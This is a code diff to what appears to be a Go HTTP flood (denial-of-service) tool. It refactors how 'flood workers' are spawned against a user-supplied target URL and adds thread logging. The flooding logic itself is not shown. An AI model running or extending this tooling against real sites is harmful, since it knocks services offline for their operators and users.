@@ -14,12 +14,12 @@ var (
 	target  = kingpin.Arg("url", "Target URL e.g http://google.com").Required().String()
 )
 
-//Attack stats variables
+//Attack stats
 var (
 	totalRequestsSent int
 	threadCounter     int
 	threadDoneCounter int
-	threadExit        chan bool
+	exitChan          chan int
 )
 
 func main() {
@@ -40,17 +40,30 @@ func main() {
 		fmt.Printf("Threads => %d\n", *threads)
 	}
 
-	threadExit := make(chan bool)
+	exitChan := make(chan int)
 
 	//Start flood workers
 	for threadCounter < *threads {
-		go floodWorker(threadCounter, *u)
+		worker := floodWorker{
+			exitChan: exitChan,
+			id:       threadCounter,
+			target:   *u,
+		}
+
+		if *verbose {
+			fmt.Printf("Thread %x started\n", threadCounter)
+		}
+
+		worker.Start()
 		threadCounter += 1
 	}
 
 	//Wait for workers to finish before exit
 	for threadDoneCounter < *threads {
-		<-threadExit
+		deadId := <- exitChan
+		if *verbose {
+			fmt.Printf("Thread %x ended\n", deadId)
+		}
 	}
 	return
 }
